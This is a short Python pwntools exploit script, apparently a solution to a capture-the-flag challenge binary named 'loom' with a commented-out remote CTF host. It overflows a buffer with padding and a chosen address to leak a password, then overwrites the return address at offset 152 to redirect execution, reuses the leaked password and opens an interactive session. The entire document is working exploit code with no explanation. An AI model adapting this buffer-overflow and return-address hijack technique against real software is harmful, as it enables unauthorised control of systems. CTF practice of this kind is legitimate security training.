from pwn import *

offset = 152

context.arch="amd64"
context.terminal = ["xfce4-terminal", "-e"]

r = process("./loom")
#r = remote("0.cloud.chals.io", 33616)

gdb.attach(r)
input()

r.recv()
r.sendline(b'1')
r.recv()
r.sendline(b'1')

#Leak password
r.sendline(b'A'*280+p64(0x0040232a))
r.recv()
r.sendline(b'2')
r.recvuntil(b'ancient : \n\n')
password = r.recvline()[:-1]
#print(password)
r.sendline(b'1')
r.recv()
r.sendline(b'1')
r.recv()

#Overflow ret address
r.sendline(b'A'*152+p64(0x004012b6))
r.recv()
r.sendline(b'3')
r.recv()
r.sendline(password)
r.recv()
r.sendline(b'1')
r.interactive()